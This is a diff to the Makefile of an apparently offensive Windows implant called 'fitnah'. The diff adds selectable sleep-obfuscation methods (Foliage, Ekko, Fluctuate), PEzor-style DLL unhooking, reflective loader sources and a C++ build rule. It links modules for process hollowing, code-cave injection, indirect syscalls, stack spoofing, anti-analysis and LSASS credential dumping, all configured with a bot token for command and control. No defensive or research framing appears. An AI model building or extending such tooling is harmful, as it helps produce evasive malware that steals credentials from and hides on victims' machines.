@@ -11,13 +11,21 @@
 ARCH       ?= x64
 ifeq ($(ARCH),x86)
   CC       = i686-w64-mingw32-gcc
+  CXX      = i686-w64-mingw32-g++
   AS       = nasm -f win32
   SUFFIX   = _x86
 else
   CC       = x86_64-w64-mingw32-gcc
+  CXX      = x86_64-w64-mingw32-g++
   AS       = nasm -f win64
   SUFFIX   = _x64
 endif
+
+# ── Sleep obfuscation method ──────────────────────────────────────────────────
+# SLEEP_OBF=foliage   (default) APC ROP chain + RC4   — most evasive, needs timer queue
+# SLEEP_OBF=fluctuate           Sleep() hook + XOR    — simpler, works everywhere
+# SLEEP_OBF=ekko                Timer-queue Ekko RC4  — original CS Ekko variant
+SLEEP_OBF  ?= foliage
 
 # ── Agent config (required) ───────────────────────────────────────────────────
 TOKEN      ?= YOUR_BOT_TOKEN
@@ -51,21 +59,30 @@ ASM_OBJS  = $(OUTDIR)/syscalls.obj              \
             $(OUTDIR)/stack_spoof.obj
 
 # Syscall / injection / loading
-SRCS_INJECT = ../fitnah/implant/syscall/indirect_syscall.c  \
-              ../fitnah/implant/injection/rdi_loader.c       \
-              ../fitnah/implant/injection/code_cave.c        \
-              ../fitnah/implant/injection/process_mirror.c   \
-              ../fitnah/implant/process_hollowing.c          \
-              ../fitnah/implant/reflective_loader.c          \
-              ../fitnah/implant/loader/bof_loader.c
+SRCS_INJECT = ../fitnah/implant/syscall/indirect_syscall.c       \
+              ../fitnah/implant/injection/rdi_loader.c            \
+              ../fitnah/implant/injection/ReflectiveLoader.c      \
+              ../fitnah/implant/injection/LoadLibraryR.c          \
+              ../fitnah/implant/injection/GetProcAddressR.c       \
+              ../fitnah/implant/injection/code_cave.c             \
+              ../fitnah/implant/injection/process_mirror.c        \
+              ../fitnah/implant/process_hollowing.c               \
+              ../fitnah/implant/reflective_loader.c               \
+              ../fitnah/implant/loader/bof_loader.c               \
+              ../fitnah/implant/ApiSetMap.c
 
-# Evasion — upgraded with Havoc evasion techniques
-SRCS_EVASION = ../fitnah/implant/evasion/foliage_obf.c      \
-               ../fitnah/implant/evasion/stack_spoof.c       \
-               ../fitnah/implant/evasion/hwbp_bypass.c       \
-               ../fitnah/implant/evasion/memory_patcher.c    \
-               ../fitnah/implant/evasion/unhook.c            \
-               ../fitnah/implant/evasion/anti_analysis.c
+# Evasion — Havoc evasion + PEzor pe_refresh (all-DLL unhook)
+SRCS_EVASION = ../fitnah/implant/evasion/foliage_obf.c           \
+               ../fitnah/implant/evasion/stack_spoof.c            \
+               ../fitnah/implant/evasion/hwbp_bypass.c            \
+               ../fitnah/implant/evasion/memory_patcher.c         \
+               ../fitnah/implant/evasion/unhook.c                 \
+               ../fitnah/implant/evasion/anti_analysis.c          \
+               ../fitnah/implant/evasion/pe_refresh.c
+
+# fluctuate.cpp (PEzor Sleep-hook XOR obfuscation) compiled with g++
+SRCS_FLUCTUATE_CPP = ../fitnah/implant/evasion/fluctuate.cpp
+OBJS_FLUCTUATE     = $(OUTDIR)/fluctuate.obj
 
 # Collection / exploitation
 SRCS_OPS  = ../fitnah/implant/collection/lsass_dump.c \
@@ -95,19 +112,32 @@ DEFINES  = -DFITNAH_BOT_TOKEN=$(TOKEN)   \
            -DFITNAH_SLEEP=$(SLEEP)       \
            -DFITNAH_JITTER=$(JITTER)
 
+# Sleep obfuscation compile-time selection
+ifeq ($(SLEEP_OBF),fluctuate)
+  DEFINES += -DSLEEP_FLUCTUATE -DFLUCTUATE_NA
+else ifeq ($(SLEEP_OBF),ekko)
+  DEFINES += -DSLEEP_EKKO
+# default: foliage (no extra define needed — always compiled in)
+endif
+
 CFLAGS   = -O2 -s -mwindows -static \
            -Wall -Wno-unused-function \
            -Wno-unused-variable
 
 LDFLAGS  = -lwininet -lbcrypt -lntdll -lgdi32 -luser32 -ladvapi32 \
-           -lole32 -loleaut32 -lpsapi -ldbghelp
+           -lole32 -loleaut32 -lpsapi -ldbghelp -lstdc++
 
 # ── Targets ───────────────────────────────────────────────────────────────────
 .PHONY: all clean
 
-all: $(OUTDIR) $(ASM_OBJS)
-	$(CC) $(SRCS) $(ASM_OBJS) $(INCLUDES) $(DEFINES) $(CFLAGS) $(LDFLAGS) -o $(TARGET)
-	@echo "[+] Built: $(TARGET)"
+all: $(OUTDIR) $(ASM_OBJS) $(OBJS_FLUCTUATE)
+	$(CC) $(SRCS) $(ASM_OBJS) $(OBJS_FLUCTUATE) \
+	    $(INCLUDES) $(DEFINES) $(CFLAGS) $(LDFLAGS) -o $(TARGET)
+	@echo "[+] Built: $(TARGET) (sleep-obf: $(SLEEP_OBF))"
+
+# fluctuate.cpp requires g++ (uses C++ stdlib headers)
+$(OUTDIR)/fluctuate.obj: ../fitnah/implant/evasion/fluctuate.cpp | $(OUTDIR)
+	$(CXX) -c $< -O2 -mwindows $(INCLUDES) $(DEFINES) -o $@
 
 $(OUTDIR)/syscalls.obj: ../fitnah/implant/asm/syscalls.asm | $(OUTDIR)
 	$(AS) $< -o $@
